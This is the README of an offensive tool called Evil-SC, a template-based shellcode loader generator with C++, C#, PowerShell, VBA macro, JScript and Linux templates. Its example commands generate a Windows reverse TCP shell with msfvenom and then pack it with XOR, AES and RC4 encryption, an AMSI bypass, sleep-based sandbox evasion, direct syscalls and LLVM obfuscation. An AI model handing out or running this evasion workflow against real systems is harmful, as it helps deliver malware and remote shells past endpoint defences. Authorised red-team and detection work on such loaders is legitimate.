# Evil-SC - Template-based Shellcode Loader

## Introduction
Evil-SC is a template-based shellcode loader written in Python. It allows you to generate loader files for injecting shellcode into a target process, using different methods and encoders.

!! WORK IN PROGRESS !!

## Todo
- Functions name randomization ?
- Implement nullgate Indirect Syscalls
- Implement SecureString Encryptor for Powershell
- Make new Sandbox evasion templates
- Make new methods templates

## Usage
1. Clone the repository:
```bash
git clone https://github.com/your_username/evil-sc.git
cd evil-sc
```

2. Install dependencies
```
sudo apt install mono-complete, mingw-w64
```

3. Run the script
```
$ python evil-sc.py windows -h

    ███████╗██╗   ██╗██╗██╗      ███████╗ ██████╗
    ██╔════╝██║   ██║██║██║      ██╔════╝██╔════╝
    █████╗  ██║   ██║██║██║█████╗███████╗██║
    ██╔══╝  ╚██╗ ██╔╝██║██║╚════╝╚════██║██║
    ███████╗ ╚████╔╝ ██║███████╗ ███████║╚██████╗
    ╚══════╝  ╚═══╝  ╚═╝╚══════╝ ╚══════╝ ╚═════╝
                                                 @v4resk

usage: evil-sc.py [-h] {windows_cpp,windows_cs,windows_pwsh,windows_vba,windows_js,linux,utils} ...

Template-based Shellcode Loader

positional arguments:
  {windows_cpp,windows_cs,windows_pwsh,windows_vba,windows_js,linux,utils}
                        Module to be used
    windows_cpp         Native Windows Shellcode Loader (C++)
    windows_cs          Dotnet Windows Shellcode Loader (C#)
    windows_pwsh        Powershell Windows Shellcode Loader
    windows_vba         Microsoft Office Macros Shellcode Loader (VBA)
    windows_js          JScript Windows Shellcode Loader
    linux               Native Linux Shellcode Loader (C++)
    utils               Utility module for shellcodes

options:
  -h, --help            show this help message and exit

```

## Examples

1. Generate a shellcode
```bash
# Generate a shellcode
msfvenom -p windows/x64/shell_reverse_tcp -f raw -o /tmp/msfout.bin
```

2. Pack the shellcode (see examples below) ! 
```bash
# Use Venoma C# template, XOR and AES encryption, AMSI Bypass
python evil-sc.py windows_cs -m Venoma msf.raw -em amsi -e aes -e xor

# Use DSys_CurrentThread C++ template, RC4 encryption, sleep for evasion, GetSyscallStub for direct syscalls, obfuscation using LLVMO
python evil-sc.py windows_cpp -m DSys_CurrentThread msf.raw -e rc4 -em sleep --llvmo

# Use DSys_CurrentThread C++ template, RC4 encryption, sleep for evasion, SysWhispers3 for direct syscalls
python evil-sc.py windows_cpp -m DSys_CurrentThread msf.raw -e rc4 -em sleep -sc SysWhispers3

# Use PowerIject Powershell template, Double XOR encryption, AMSI Bypass
python evil-sc.py windows_pwsh -m PowerInject msf.raw -e xor -e xor -em amsi

# Use simple exec C++ template for linux, with xor encryption, obfuscation using LLVMO
python evil-sc.py linux -m SimpleExec msf.raw -e xor -l
```


## Resources

[]()
[]()
[]()
[]()
[]()
[]()
[]()
[]()
[]()
[]()
[]()